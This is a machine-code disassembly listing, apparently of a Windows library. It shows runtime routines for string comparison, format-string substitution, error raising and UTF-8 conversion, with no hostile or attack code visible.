    6d8c56c9:	eb d7                	jmp    0x6d8c56a2
    6d8c56cb:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
    6d8c56cf:	c3                   	ret
    6d8c56d0:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c56d4:	45 31 c9             	xor    %r9d,%r9d
    6d8c56d7:	45 31 c0             	xor    %r8d,%r8d
    6d8c56da:	e8 ac ff ff ff       	call   0x6d8c568b
    6d8c56df:	48 f7 d0             	not    %rax
    6d8c56e2:	48 c1 e8 3f          	shr    $0x3f,%rax
    6d8c56e6:	48 83 c4 28          	add    $0x28,%rsp
    6d8c56ea:	c3                   	ret
    6d8c56eb:	56                   	push   %rsi
    6d8c56ec:	53                   	push   %rbx
    6d8c56ed:	48 83 ec 38          	sub    $0x38,%rsp
    6d8c56f1:	48 8b 0d 48 30 0f 00 	mov    0xf3048(%rip),%rcx        # 0x6d9b8740
    6d8c56f8:	ba 30 00 00 00       	mov    $0x30,%edx
    6d8c56fd:	e8 53 e7 ff ff       	call   0x6d8c3e55
    6d8c5702:	48 8d 0d 97 cf 00 00 	lea    0xcf97(%rip),%rcx        # 0x6d8d26a0
    6d8c5709:	48 89 c3             	mov    %rax,%rbx
    6d8c570c:	48 8b 05 8d 30 0f 00 	mov    0xf308d(%rip),%rax        # 0x6d9b87a0
    6d8c5713:	48 8b 73 18          	mov    0x18(%rbx),%rsi
    6d8c5717:	48 89 03             	mov    %rax,(%rbx)
    6d8c571a:	48 8d 05 3f cf 00 00 	lea    0xcf3f(%rip),%rax        # 0x6d8d2660
    6d8c5721:	48 89 43 10          	mov    %rax,0x10(%rbx)
    6d8c5725:	e8 a6 e7 ff ff       	call   0x6d8c3ed0
    6d8c572a:	48 85 f6             	test   %rsi,%rsi
    6d8c572d:	48 89 43 18          	mov    %rax,0x18(%rbx)
    6d8c5731:	74 26                	je     0x6d8c5759
    6d8c5733:	48 8b 46 f0          	mov    -0x10(%rsi),%rax
    6d8c5737:	48 8d 56 f0          	lea    -0x10(%rsi),%rdx
    6d8c573b:	48 83 e8 08          	sub    $0x8,%rax
    6d8c573f:	48 83 f8 07          	cmp    $0x7,%rax
    6d8c5743:	48 89 46 f0          	mov    %rax,-0x10(%rsi)
    6d8c5747:	77 10                	ja     0x6d8c5759
    6d8c5749:	48 8b 0d 40 31 0f 00 	mov    0xf3140(%rip),%rcx        # 0x6d9b8890
    6d8c5750:	48 83 c1 18          	add    $0x18,%rcx
    6d8c5754:	e8 12 d6 ff ff       	call   0x6d8c2d6b
    6d8c5759:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
    6d8c575d:	48 85 c9             	test   %rcx,%rcx
    6d8c5760:	74 26                	je     0x6d8c5788
    6d8c5762:	48 8b 41 f0          	mov    -0x10(%rcx),%rax
    6d8c5766:	48 8d 51 f0          	lea    -0x10(%rcx),%rdx
    6d8c576a:	48 83 e8 08          	sub    $0x8,%rax
    6d8c576e:	48 83 f8 07          	cmp    $0x7,%rax
    6d8c5772:	48 89 41 f0          	mov    %rax,-0x10(%rcx)
    6d8c5776:	77 10                	ja     0x6d8c5788
    6d8c5778:	48 8b 0d 11 31 0f 00 	mov    0xf3111(%rip),%rcx        # 0x6d9b8890
    6d8c577f:	48 83 c1 18          	add    $0x18,%rcx
    6d8c5783:	e8 e3 d5 ff ff       	call   0x6d8c2d6b
    6d8c5788:	48 c7 43 08 00 00 00 	movq   $0x0,0x8(%rbx)
    6d8c578f:	00 
    6d8c5790:	4c 8d 0d d4 ce 00 00 	lea    0xced4(%rip),%r9        # 0x6d8d266b
    6d8c5797:	48 89 d9             	mov    %rbx,%rcx
    6d8c579a:	48 c7 44 24 20 68 0a 	movq   $0xa68,0x20(%rsp)
    6d8c57a1:	00 00 
    6d8c57a3:	4c 8d 05 ce ce 00 00 	lea    0xcece(%rip),%r8        # 0x6d8d2678
    6d8c57aa:	48 8d 15 af ce 00 00 	lea    0xceaf(%rip),%rdx        # 0x6d8d2660
    6d8c57b1:	e8 41 ef ff ff       	call   0x6d8c46f7
    6d8c57b6:	90                   	nop
    6d8c57b7:	48 83 c4 38          	add    $0x38,%rsp
    6d8c57bb:	5b                   	pop    %rbx
    6d8c57bc:	5e                   	pop    %rsi
    6d8c57bd:	c3                   	ret
    6d8c57be:	56                   	push   %rsi
    6d8c57bf:	53                   	push   %rbx
    6d8c57c0:	31 db                	xor    %ebx,%ebx
    6d8c57c2:	48 85 c9             	test   %rcx,%rcx
    6d8c57c5:	74 03                	je     0x6d8c57ca
    6d8c57c7:	48 8b 19             	mov    (%rcx),%rbx
    6d8c57ca:	45 31 db             	xor    %r11d,%r11d
    6d8c57cd:	48 85 d2             	test   %rdx,%rdx
    6d8c57d0:	74 03                	je     0x6d8c57d5
    6d8c57d2:	4c 8b 1a             	mov    (%rdx),%r11
    6d8c57d5:	45 31 d2             	xor    %r10d,%r10d
    6d8c57d8:	45 31 c0             	xor    %r8d,%r8d
    6d8c57db:	4c 39 d3             	cmp    %r10,%rbx
    6d8c57de:	7e 18                	jle    0x6d8c57f8
    6d8c57e0:	42 80 7c 11 10 5f    	cmpb   $0x5f,0x10(%rcx,%r10,1)
    6d8c57e6:	75 10                	jne    0x6d8c57f8
    6d8c57e8:	49 ff c2             	inc    %r10
    6d8c57eb:	eb ee                	jmp    0x6d8c57db
    6d8c57ed:	42 80 7c 02 10 5f    	cmpb   $0x5f,0x10(%rdx,%r8,1)
    6d8c57f3:	75 08                	jne    0x6d8c57fd
    6d8c57f5:	49 ff c0             	inc    %r8
    6d8c57f8:	4d 39 d8             	cmp    %r11,%r8
    6d8c57fb:	7c f0                	jl     0x6d8c57ed
    6d8c57fd:	31 c0                	xor    %eax,%eax
    6d8c57ff:	4c 39 d3             	cmp    %r10,%rbx
    6d8c5802:	7e 12                	jle    0x6d8c5816
    6d8c5804:	42 8a 44 11 10       	mov    0x10(%rcx,%r10,1),%al
    6d8c5809:	44 8d 48 bf          	lea    -0x41(%rax),%r9d
    6d8c580d:	41 80 f9 19          	cmp    $0x19,%r9b
    6d8c5811:	77 03                	ja     0x6d8c5816
    6d8c5813:	83 c0 20             	add    $0x20,%eax
    6d8c5816:	45 31 c9             	xor    %r9d,%r9d
    6d8c5819:	4d 39 d8             	cmp    %r11,%r8
    6d8c581c:	7d 13                	jge    0x6d8c5831
    6d8c581e:	46 8a 4c 02 10       	mov    0x10(%rdx,%r8,1),%r9b
    6d8c5823:	41 8d 71 bf          	lea    -0x41(%r9),%esi
    6d8c5827:	40 80 fe 19          	cmp    $0x19,%sil
    6d8c582b:	77 04                	ja     0x6d8c5831
    6d8c582d:	41 83 c1 20          	add    $0x20,%r9d
    6d8c5831:	0f b6 c0             	movzbl %al,%eax
    6d8c5834:	45 0f b6 c9          	movzbl %r9b,%r9d
    6d8c5838:	44 29 c8             	sub    %r9d,%eax
    6d8c583b:	75 23                	jne    0x6d8c5860
    6d8c583d:	4c 39 d3             	cmp    %r10,%rbx
    6d8c5840:	7e 0c                	jle    0x6d8c584e
    6d8c5842:	4d 39 d8             	cmp    %r11,%r8
    6d8c5845:	7c 14                	jl     0x6d8c585b
    6d8c5847:	b8 01 00 00 00       	mov    $0x1,%eax
    6d8c584c:	eb 14                	jmp    0x6d8c5862
    6d8c584e:	31 c0                	xor    %eax,%eax
    6d8c5850:	4d 39 d8             	cmp    %r11,%r8
    6d8c5853:	0f 9c c0             	setl   %al
    6d8c5856:	48 f7 d8             	neg    %rax
    6d8c5859:	eb 07                	jmp    0x6d8c5862
    6d8c585b:	49 ff c0             	inc    %r8
    6d8c585e:	eb 88                	jmp    0x6d8c57e8
    6d8c5860:	48 98                	cltq
    6d8c5862:	5b                   	pop    %rbx
    6d8c5863:	5e                   	pop    %rsi
    6d8c5864:	c3                   	ret
    6d8c5865:	55                   	push   %rbp
    6d8c5866:	57                   	push   %rdi
    6d8c5867:	56                   	push   %rsi
    6d8c5868:	53                   	push   %rbx
    6d8c5869:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c586d:	31 db                	xor    %ebx,%ebx
    6d8c586f:	49 8d 68 ff          	lea    -0x1(%r8),%rbp
    6d8c5873:	48 89 ce             	mov    %rcx,%rsi
    6d8c5876:	48 89 d7             	mov    %rdx,%rdi
    6d8c5879:	48 39 dd             	cmp    %rbx,%rbp
    6d8c587c:	7e 17                	jle    0x6d8c5895
    6d8c587e:	48 8b 14 df          	mov    (%rdi,%rbx,8),%rdx
    6d8c5882:	48 89 f1             	mov    %rsi,%rcx
    6d8c5885:	e8 34 ff ff ff       	call   0x6d8c57be
    6d8c588a:	48 85 c0             	test   %rax,%rax
    6d8c588d:	74 0a                	je     0x6d8c5899
    6d8c588f:	48 83 c3 02          	add    $0x2,%rbx
    6d8c5893:	eb e4                	jmp    0x6d8c5879
    6d8c5895:	48 83 cb ff          	or     $0xffffffffffffffff,%rbx
    6d8c5899:	48 89 d8             	mov    %rbx,%rax
    6d8c589c:	48 83 c4 28          	add    $0x28,%rsp
    6d8c58a0:	5b                   	pop    %rbx
    6d8c58a1:	5e                   	pop    %rsi
    6d8c58a2:	5f                   	pop    %rdi
    6d8c58a3:	5d                   	pop    %rbp
    6d8c58a4:	c3                   	ret
    6d8c58a5:	41 57                	push   %r15
    6d8c58a7:	41 56                	push   %r14
    6d8c58a9:	41 55                	push   %r13
    6d8c58ab:	41 54                	push   %r12
    6d8c58ad:	55                   	push   %rbp
    6d8c58ae:	57                   	push   %rdi
    6d8c58af:	56                   	push   %rsi
    6d8c58b0:	53                   	push   %rbx
    6d8c58b1:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c58b5:	45 31 ed             	xor    %r13d,%r13d
    6d8c58b8:	31 db                	xor    %ebx,%ebx
    6d8c58ba:	48 89 ce             	mov    %rcx,%rsi
    6d8c58bd:	48 89 d7             	mov    %rdx,%rdi
    6d8c58c0:	4d 89 c4             	mov    %r8,%r12
    6d8c58c3:	4d 8d 71 ff          	lea    -0x1(%r9),%r14
    6d8c58c7:	4c 89 cd             	mov    %r9,%rbp
    6d8c58ca:	31 c9                	xor    %ecx,%ecx
    6d8c58cc:	48 85 ff             	test   %rdi,%rdi
    6d8c58cf:	74 03                	je     0x6d8c58d4
    6d8c58d1:	48 8b 0f             	mov    (%rdi),%rcx
    6d8c58d4:	48 39 cb             	cmp    %rcx,%rbx
    6d8c58d7:	0f 8d 64 02 00 00    	jge    0x6d8c5b41
    6d8c58dd:	0f be 54 1f 10       	movsbl 0x10(%rdi,%rbx,1),%edx
    6d8c58e2:	4c 8d 7b 01          	lea    0x1(%rbx),%r15
    6d8c58e6:	80 fa 24             	cmp    $0x24,%dl
    6d8c58e9:	75 05                	jne    0x6d8c58f0
    6d8c58eb:	4c 39 f9             	cmp    %r15,%rcx
    6d8c58ee:	7f 18                	jg     0x6d8c5908
    6d8c58f0:	48 8b 0e             	mov    (%rsi),%rcx
    6d8c58f3:	4c 89 fb             	mov    %r15,%rbx
    6d8c58f6:	e8 02 e7 ff ff       	call   0x6d8c3ffd
    6d8c58fb:	48 89 f1             	mov    %rsi,%rcx
    6d8c58fe:	48 89 c2             	mov    %rax,%rdx
    6d8c5901:	e8 aa e7 ff ff       	call   0x6d8c40b0
    6d8c5906:	eb c2                	jmp    0x6d8c58ca
    6d8c5908:	42 8a 44 3f 10       	mov    0x10(%rdi,%r15,1),%al
    6d8c590d:	3c 5a                	cmp    $0x5a,%al
    6d8c590f:	77 4c                	ja     0x6d8c595d
    6d8c5911:	3c 41                	cmp    $0x41,%al
    6d8c5913:	0f 83 8a 01 00 00    	jae    0x6d8c5aa3
    6d8c5919:	3c 2d                	cmp    $0x2d,%al
    6d8c591b:	0f 84 af 00 00 00    	je     0x6d8c59d0
    6d8c5921:	77 2d                	ja     0x6d8c5950
    6d8c5923:	3c 23                	cmp    $0x23,%al
    6d8c5925:	74 64                	je     0x6d8c598b
    6d8c5927:	3c 24                	cmp    $0x24,%al
    6d8c5929:	0f 85 08 02 00 00    	jne    0x6d8c5b37
    6d8c592f:	48 8b 0e             	mov    (%rsi),%rcx
    6d8c5932:	ba 24 00 00 00       	mov    $0x24,%edx
    6d8c5937:	48 83 c3 02          	add    $0x2,%rbx
    6d8c593b:	e8 bd e6 ff ff       	call   0x6d8c3ffd
    6d8c5940:	48 89 f1             	mov    %rsi,%rcx
    6d8c5943:	48 89 c2             	mov    %rax,%rdx
    6d8c5946:	e8 65 e7 ff ff       	call   0x6d8c40b0
    6d8c594b:	e9 7a ff ff ff       	jmp    0x6d8c58ca
    6d8c5950:	8d 50 cf             	lea    -0x31(%rax),%edx
    6d8c5953:	80 fa 08             	cmp    $0x8,%dl
    6d8c5956:	76 7c                	jbe    0x6d8c59d4
    6d8c5958:	e9 da 01 00 00       	jmp    0x6d8c5b37
    6d8c595d:	3c 7a                	cmp    $0x7a,%al
    6d8c595f:	77 15                	ja     0x6d8c5976
    6d8c5961:	3c 61                	cmp    $0x61,%al
    6d8c5963:	0f 83 3a 01 00 00    	jae    0x6d8c5aa3
    6d8c5969:	3c 5f                	cmp    $0x5f,%al
    6d8c596b:	0f 85 c6 01 00 00    	jne    0x6d8c5b37
    6d8c5971:	e9 2d 01 00 00       	jmp    0x6d8c5aa3
    6d8c5976:	3c 7b                	cmp    $0x7b,%al
    6d8c5978:	0f 84 95 00 00 00    	je     0x6d8c5a13
    6d8c597e:	3c 80                	cmp    $0x80,%al
    6d8c5980:	0f 82 b1 01 00 00    	jb     0x6d8c5b37
    6d8c5986:	e9 18 01 00 00       	jmp    0x6d8c5aa3
    6d8c598b:	49 39 ed             	cmp    %rbp,%r13
    6d8c598e:	7c 05                	jl     0x6d8c5995
    6d8c5990:	e8 56 fd ff ff       	call   0x6d8c56eb
    6d8c5995:	4f 8d 3c ec          	lea    (%r12,%r13,8),%r15
    6d8c5999:	31 d2                	xor    %edx,%edx
    6d8c599b:	49 8b 07             	mov    (%r15),%rax
    6d8c599e:	48 85 c0             	test   %rax,%rax
    6d8c59a1:	74 03                	je     0x6d8c59a6
    6d8c59a3:	48 8b 10             	mov    (%rax),%rdx
    6d8c59a6:	48 8b 0e             	mov    (%rsi),%rcx
    6d8c59a9:	48 83 c3 02          	add    $0x2,%rbx
    6d8c59ad:	49 ff c5             	inc    %r13
    6d8c59b0:	e8 d2 e5 ff ff       	call   0x6d8c3f87
    6d8c59b5:	48 89 f1             	mov    %rsi,%rcx
    6d8c59b8:	48 89 c2             	mov    %rax,%rdx
    6d8c59bb:	e8 f0 e6 ff ff       	call   0x6d8c40b0
    6d8c59c0:	49 8b 17             	mov    (%r15),%rdx
    6d8c59c3:	48 8b 0e             	mov    (%rsi),%rcx
    6d8c59c6:	e8 95 fc ff ff       	call   0x6d8c5660
    6d8c59cb:	e9 fa fe ff ff       	jmp    0x6d8c58ca
    6d8c59d0:	4c 8d 7b 02          	lea    0x2(%rbx),%r15
    6d8c59d4:	4c 89 fb             	mov    %r15,%rbx
    6d8c59d7:	31 d2                	xor    %edx,%edx
    6d8c59d9:	48 39 cb             	cmp    %rcx,%rbx
    6d8c59dc:	7d 10                	jge    0x6d8c59ee
    6d8c59de:	44 0f b6 44 1f 10    	movzbl 0x10(%rdi,%rbx,1),%r8d
    6d8c59e4:	45 8d 48 d0          	lea    -0x30(%r8),%r9d
    6d8c59e8:	41 80 f9 09          	cmp    $0x9,%r9b
    6d8c59ec:	76 17                	jbe    0x6d8c5a05
    6d8c59ee:	49 89 ef             	mov    %rbp,%r15
    6d8c59f1:	49 29 d7             	sub    %rdx,%r15
    6d8c59f4:	3c 2d                	cmp    $0x2d,%al
    6d8c59f6:	0f 84 92 00 00 00    	je     0x6d8c5a8e
    6d8c59fc:	4c 8d 7a ff          	lea    -0x1(%rdx),%r15
    6d8c5a00:	e9 89 00 00 00       	jmp    0x6d8c5a8e
    6d8c5a05:	48 6b d2 0a          	imul   $0xa,%rdx,%rdx
    6d8c5a09:	48 ff c3             	inc    %rbx
    6d8c5a0c:	4a 8d 54 02 d0       	lea    -0x30(%rdx,%r8,1),%rdx
    6d8c5a11:	eb c6                	jmp    0x6d8c59d9
    6d8c5a13:	48 8d 53 02          	lea    0x2(%rbx),%rdx
    6d8c5a17:	44 8a 54 17 10       	mov    0x10(%rdi,%rdx,1),%r10b
    6d8c5a1c:	49 89 d0             	mov    %rdx,%r8
    6d8c5a1f:	41 80 fa 2d          	cmp    $0x2d,%r10b
    6d8c5a23:	75 04                	jne    0x6d8c5a29
    6d8c5a25:	4c 8d 43 03          	lea    0x3(%rbx),%r8
    6d8c5a29:	45 31 db             	xor    %r11d,%r11d
    6d8c5a2c:	31 c0                	xor    %eax,%eax
    6d8c5a2e:	49 8d 58 01          	lea    0x1(%r8),%rbx
    6d8c5a32:	49 39 c8             	cmp    %rcx,%r8
    6d8c5a35:	7d 11                	jge    0x6d8c5a48
    6d8c5a37:	46 0f b6 4c 07 10    	movzbl 0x10(%rdi,%r8,1),%r9d
    6d8c5a3d:	45 84 c9             	test   %r9b,%r9b
    6d8c5a40:	74 06                	je     0x6d8c5a48
    6d8c5a42:	41 80 f9 7d          	cmp    $0x7d,%r9b
    6d8c5a46:	75 0d                	jne    0x6d8c5a55
    6d8c5a48:	49 ff cb             	dec    %r11
    6d8c5a4b:	74 31                	je     0x6d8c5a7e
    6d8c5a4d:	49 ff c8             	dec    %r8
    6d8c5a50:	e9 81 00 00 00       	jmp    0x6d8c5ad6
    6d8c5a55:	45 8d 41 d0          	lea    -0x30(%r9),%r8d
    6d8c5a59:	41 80 f8 09          	cmp    $0x9,%r8b
    6d8c5a5d:	77 16                	ja     0x6d8c5a75
    6d8c5a5f:	48 6b c0 0a          	imul   $0xa,%rax,%rax
    6d8c5a63:	4d 85 db             	test   %r11,%r11
    6d8c5a66:	4a 8d 44 08 d0       	lea    -0x30(%rax,%r9,1),%rax
    6d8c5a6b:	75 0c                	jne    0x6d8c5a79
    6d8c5a6d:	41 bb 01 00 00 00    	mov    $0x1,%r11d
    6d8c5a73:	eb 04                	jmp    0x6d8c5a79
    6d8c5a75:	49 83 cb ff          	or     $0xffffffffffffffff,%r11
    6d8c5a79:	49 89 d8             	mov    %rbx,%r8
    6d8c5a7c:	eb b0                	jmp    0x6d8c5a2e
    6d8c5a7e:	4c 8d 78 ff          	lea    -0x1(%rax),%r15
    6d8c5a82:	41 80 fa 2d          	cmp    $0x2d,%r10b
    6d8c5a86:	75 06                	jne    0x6d8c5a8e
    6d8c5a88:	49 89 ef             	mov    %rbp,%r15
    6d8c5a8b:	49 29 c7             	sub    %rax,%r15
    6d8c5a8e:	4d 85 ff             	test   %r15,%r15
    6d8c5a91:	78 05                	js     0x6d8c5a98
    6d8c5a93:	49 39 ef             	cmp    %rbp,%r15
    6d8c5a96:	7c 05                	jl     0x6d8c5a9d
    6d8c5a98:	e8 4e fc ff ff       	call   0x6d8c56eb
    6d8c5a9d:	4f 8d 3c fc          	lea    (%r12,%r15,8),%r15
    6d8c5aa1:	eb 64                	jmp    0x6d8c5b07
    6d8c5aa3:	4c 89 fb             	mov    %r15,%rbx
    6d8c5aa6:	8a 44 1f 10          	mov    0x10(%rdi,%rbx,1),%al
    6d8c5aaa:	89 c2                	mov    %eax,%edx
    6d8c5aac:	83 e2 df             	and    $0xffffffdf,%edx
    6d8c5aaf:	83 ea 41             	sub    $0x41,%edx
    6d8c5ab2:	80 fa 19             	cmp    $0x19,%dl
    6d8c5ab5:	76 3c                	jbe    0x6d8c5af3
    6d8c5ab7:	41 89 c0             	mov    %eax,%r8d
    6d8c5aba:	41 c0 e8 07          	shr    $0x7,%r8b
    6d8c5abe:	3c 5f                	cmp    $0x5f,%al
    6d8c5ac0:	0f 94 c2             	sete   %dl
    6d8c5ac3:	41 08 d0             	or     %dl,%r8b
    6d8c5ac6:	75 2b                	jne    0x6d8c5af3
    6d8c5ac8:	83 e8 30             	sub    $0x30,%eax
    6d8c5acb:	3c 09                	cmp    $0x9,%al
    6d8c5acd:	76 24                	jbe    0x6d8c5af3
    6d8c5acf:	4c 8d 43 ff          	lea    -0x1(%rbx),%r8
    6d8c5ad3:	4c 89 fa             	mov    %r15,%rdx
    6d8c5ad6:	48 89 f9             	mov    %rdi,%rcx
    6d8c5ad9:	e8 f0 f1 ff ff       	call   0x6d8c4cce
    6d8c5ade:	49 89 e8             	mov    %rbp,%r8
    6d8c5ae1:	4c 89 e2             	mov    %r12,%rdx
    6d8c5ae4:	48 89 c1             	mov    %rax,%rcx
    6d8c5ae7:	e8 79 fd ff ff       	call   0x6d8c5865
    6d8c5aec:	48 85 c0             	test   %rax,%rax
    6d8c5aef:	79 0c                	jns    0x6d8c5afd
    6d8c5af1:	eb 44                	jmp    0x6d8c5b37
    6d8c5af3:	48 ff c3             	inc    %rbx
    6d8c5af6:	48 39 d9             	cmp    %rbx,%rcx
    6d8c5af9:	74 d4                	je     0x6d8c5acf
    6d8c5afb:	eb a9                	jmp    0x6d8c5aa6
    6d8c5afd:	49 39 c6             	cmp    %rax,%r14
    6d8c5b00:	7e 35                	jle    0x6d8c5b37
    6d8c5b02:	4d 8d 7c c4 08       	lea    0x8(%r12,%rax,8),%r15
    6d8c5b07:	49 8b 07             	mov    (%r15),%rax
    6d8c5b0a:	31 d2                	xor    %edx,%edx
    6d8c5b0c:	48 85 c0             	test   %rax,%rax
    6d8c5b0f:	74 03                	je     0x6d8c5b14
    6d8c5b11:	48 8b 10             	mov    (%rax),%rdx
    6d8c5b14:	48 8b 0e             	mov    (%rsi),%rcx
    6d8c5b17:	e8 6b e4 ff ff       	call   0x6d8c3f87
    6d8c5b1c:	48 89 f1             	mov    %rsi,%rcx
    6d8c5b1f:	48 89 c2             	mov    %rax,%rdx
    6d8c5b22:	e8 89 e5 ff ff       	call   0x6d8c40b0
    6d8c5b27:	49 8b 17             	mov    (%r15),%rdx
    6d8c5b2a:	48 8b 0e             	mov    (%rsi),%rcx
    6d8c5b2d:	e8 2e fb ff ff       	call   0x6d8c5660
    6d8c5b32:	e9 93 fd ff ff       	jmp    0x6d8c58ca
    6d8c5b37:	e8 af fb ff ff       	call   0x6d8c56eb
    6d8c5b3c:	e9 89 fd ff ff       	jmp    0x6d8c58ca
    6d8c5b41:	48 83 c4 28          	add    $0x28,%rsp
    6d8c5b45:	5b                   	pop    %rbx
    6d8c5b46:	5e                   	pop    %rsi
    6d8c5b47:	5f                   	pop    %rdi
    6d8c5b48:	5d                   	pop    %rbp
    6d8c5b49:	41 5c                	pop    %r12
    6d8c5b4b:	41 5d                	pop    %r13
    6d8c5b4d:	41 5e                	pop    %r14
    6d8c5b4f:	41 5f                	pop    %r15
    6d8c5b51:	c3                   	ret
    6d8c5b52:	56                   	push   %rsi
    6d8c5b53:	53                   	push   %rbx
    6d8c5b54:	48 83 ec 38          	sub    $0x38,%rsp
    6d8c5b58:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
    6d8c5b5f:	00 00 
    6d8c5b61:	48 89 cb             	mov    %rcx,%rbx
    6d8c5b64:	31 c9                	xor    %ecx,%ecx
    6d8c5b66:	48 89 d6             	mov    %rdx,%rsi
    6d8c5b69:	48 85 db             	test   %rbx,%rbx
    6d8c5b6c:	74 03                	je     0x6d8c5b71
    6d8c5b6e:	48 8b 0b             	mov    (%rbx),%rcx
    6d8c5b71:	31 c0                	xor    %eax,%eax
    6d8c5b73:	48 85 f6             	test   %rsi,%rsi
    6d8c5b76:	74 03                	je     0x6d8c5b7b
    6d8c5b78:	48 8b 06             	mov    (%rsi),%rax
    6d8c5b7b:	48 01 c1             	add    %rax,%rcx
    6d8c5b7e:	e8 d1 e3 ff ff       	call   0x6d8c3f54
    6d8c5b83:	48 89 f1             	mov    %rsi,%rcx
    6d8c5b86:	48 c7 44 24 28 00 00 	movq   $0x0,0x28(%rsp)
    6d8c5b8d:	00 00 
    6d8c5b8f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
    6d8c5b94:	e8 a3 f0 ff ff       	call   0x6d8c4c3c
    6d8c5b99:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
    6d8c5b9e:	41 b9 01 00 00 00    	mov    $0x1,%r9d
    6d8c5ba4:	48 89 da             	mov    %rbx,%rdx
    6d8c5ba7:	4c 8d 44 24 28       	lea    0x28(%rsp),%r8
    6d8c5bac:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
    6d8c5bb1:	e8 ef fc ff ff       	call   0x6d8c58a5
    6d8c5bb6:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
    6d8c5bbb:	48 83 c4 38          	add    $0x38,%rsp
    6d8c5bbf:	5b                   	pop    %rbx
    6d8c5bc0:	5e                   	pop    %rsi
    6d8c5bc1:	c3                   	ret
    6d8c5bc2:	90                   	nop
    6d8c5bc3:	90                   	nop
    6d8c5bc4:	90                   	nop
    6d8c5bc5:	90                   	nop
    6d8c5bc6:	90                   	nop
    6d8c5bc7:	90                   	nop
    6d8c5bc8:	90                   	nop
    6d8c5bc9:	90                   	nop
    6d8c5bca:	90                   	nop
    6d8c5bcb:	90                   	nop
    6d8c5bcc:	90                   	nop
    6d8c5bcd:	90                   	nop
    6d8c5bce:	90                   	nop
    6d8c5bcf:	90                   	nop
    6d8c5bd0:	48 8d 05 09 cb 00 00 	lea    0xcb09(%rip),%rax        # 0x6d8d26e0
    6d8c5bd7:	48 85 c9             	test   %rcx,%rcx
    6d8c5bda:	74 0a                	je     0x6d8c5be6
    6d8c5bdc:	48 83 39 00          	cmpq   $0x0,(%rcx)
    6d8c5be0:	74 04                	je     0x6d8c5be6
    6d8c5be2:	48 8d 41 10          	lea    0x10(%rcx),%rax
    6d8c5be6:	c3                   	ret
    6d8c5be7:	eb e7                	jmp    0x6d8c5bd0
    6d8c5be9:	89 c8                	mov    %ecx,%eax
    6d8c5beb:	c3                   	ret
    6d8c5bec:	48 ff c1             	inc    %rcx
    6d8c5bef:	48 01 c9             	add    %rcx,%rcx
    6d8c5bf2:	e9 2f e5 ff ff       	jmp    0x6d8c4126
    6d8c5bf7:	55                   	push   %rbp
    6d8c5bf8:	57                   	push   %rdi
    6d8c5bf9:	56                   	push   %rsi
    6d8c5bfa:	53                   	push   %rbx
    6d8c5bfb:	48 83 ec 38          	sub    $0x38,%rsp
    6d8c5bff:	31 db                	xor    %ebx,%ebx
    6d8c5c01:	48 85 c9             	test   %rcx,%rcx
    6d8c5c04:	48 89 ce             	mov    %rcx,%rsi
    6d8c5c07:	48 89 d7             	mov    %rdx,%rdi
    6d8c5c0a:	74 56                	je     0x6d8c5c62
    6d8c5c0c:	41 89 d1             	mov    %edx,%r9d
    6d8c5c0f:	49 89 c8             	mov    %rcx,%r8
    6d8c5c12:	31 d2                	xor    %edx,%edx
    6d8c5c14:	c7 44 24 28 00 00 00 	movl   $0x0,0x28(%rsp)
    6d8c5c1b:	00 
    6d8c5c1c:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
    6d8c5c23:	00 00 
    6d8c5c25:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
    6d8c5c2a:	ff 15 d8 8b 10 00    	call   *0x108bd8(%rip)        # 0x6d9ce808
    6d8c5c30:	48 63 c8             	movslq %eax,%rcx
    6d8c5c33:	48 89 cd             	mov    %rcx,%rbp
    6d8c5c36:	e8 b1 ff ff ff       	call   0x6d8c5bec
    6d8c5c3b:	48 89 c1             	mov    %rax,%rcx
    6d8c5c3e:	48 89 c3             	mov    %rax,%rbx
    6d8c5c41:	e8 8a ff ff ff       	call   0x6d8c5bd0
    6d8c5c46:	89 6c 24 28          	mov    %ebp,0x28(%rsp)
    6d8c5c4a:	41 89 f9             	mov    %edi,%r9d
    6d8c5c4d:	49 89 f0             	mov    %rsi,%r8
    6d8c5c50:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
    6d8c5c55:	31 d2                	xor    %edx,%edx
    6d8c5c57:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
    6d8c5c5c:	ff 15 a6 8b 10 00    	call   *0x108ba6(%rip)        # 0x6d9ce808
    6d8c5c62:	48 89 d8             	mov    %rbx,%rax
    6d8c5c65:	48 83 c4 38          	add    $0x38,%rsp
    6d8c5c69:	5b                   	pop    %rbx
    6d8c5c6a:	5e                   	pop    %rsi
    6d8c5c6b:	5f                   	pop    %rdi
    6d8c5c6c:	5d                   	pop    %rbp
    6d8c5c6d:	c3                   	ret
    6d8c5c6e:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c5c72:	e8 59 ff ff ff       	call   0x6d8c5bd0
    6d8c5c77:	31 d2                	xor    %edx,%edx
    6d8c5c79:	48 85 c9             	test   %rcx,%rcx
    6d8c5c7c:	74 03                	je     0x6d8c5c81
    6d8c5c7e:	48 8b 11             	mov    (%rcx),%rdx
    6d8c5c81:	48 89 c1             	mov    %rax,%rcx
    6d8c5c84:	e8 6e ff ff ff       	call   0x6d8c5bf7
    6d8c5c89:	48 89 c1             	mov    %rax,%rcx
    6d8c5c8c:	48 83 c4 28          	add    $0x28,%rsp
    6d8c5c90:	e9 3b ff ff ff       	jmp    0x6d8c5bd0
    6d8c5c95:	48 83 ec 28          	sub    $0x28,%rsp
    6d8c5c99:	48 8d 0d 80 ca 00 00 	lea    0xca80(%rip),%rcx        # 0x6d8d2720
    6d8c5ca0:	e8 b2 ed ff ff       	call   0x6d8c4a57
    6d8c5ca5:	48 85 c0             	test   %rax,%rax
    6d8c5ca8:	48 89 05 a1 67 0f 00 	mov    %rax,0xf67a1(%rip)        # 0x6d9bc450
    6d8c5caf:	75 0c                	jne    0x6d8c5cbd
    6d8c5cb1:	48 8d 0d 48 ca 00 00 	lea    0xca48(%rip),%rcx        # 0x6d8d2700
    6d8c5cb8:	e8 b1 ed ff ff       	call   0x6d8c4a6e
